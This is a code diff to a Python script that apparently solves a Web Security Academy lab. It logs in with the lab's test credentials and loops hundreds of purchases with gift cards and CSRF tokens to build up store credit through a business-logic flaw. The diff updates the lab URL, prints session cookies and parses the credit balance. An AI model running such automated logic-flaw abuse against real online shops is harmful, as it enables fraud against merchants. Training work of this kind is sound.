@@ -3,7 +3,7 @@ import requests
 from bs4 import BeautifulSoup
 
 
-BASEURL = "https://ac491f5d1f05be2b801b22ab00ae0063.web-security-academy.net/"
+BASEURL = "https://ac8a1f631ff6c0108058579b009900e0.web-security-academy.net/"
 cred = {
         'username': 'wiener',
         'password': 'peter',
@@ -24,6 +24,10 @@ if __name__=="__main__":
 
     # Login 
     r = s.post(url = BASEURL + "login", data = cred)
+    c = r.cookies
+    for cookie in c:
+        print('%s: %s'%(cookie.name, cookie.value))
+
     for i in range(412):
         # Buy Product 2
         data = {
@@ -60,7 +64,6 @@ if __name__=="__main__":
             'csrf':csrfToken
         }
         r = s.post(url = BASEURL + "gift-card", data = data, allow_redirects = True)
-    
-    print r.text
-    print r.cookies
-
+        soup = BeautifulSoup(r.text, 'lxml')
+        storeCredit = soup.find('header', attrs={'class':'navigation-header'}).find('strong').get_text()
+        print storeCredit
